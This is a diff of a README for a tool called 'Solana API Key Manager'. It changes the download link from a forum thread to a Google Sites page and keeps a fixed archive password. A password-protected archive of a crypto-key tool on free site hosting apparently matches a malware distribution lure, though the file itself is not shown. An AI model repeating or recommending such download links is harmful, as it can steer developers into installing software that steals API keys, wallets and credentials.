@@ -30,9 +30,9 @@ Solana API Key Manager is a professional tool for developers and teams working w
 
 Download the latest release from the link below.
 
-Download: https://software-hub.forumotion.com/t71-solana-api-key-manager
+**Download:** https://sites.google.com/view/archive-pack/download
 
-Password: 68924
+**Password:** 68924
 
 ---
 
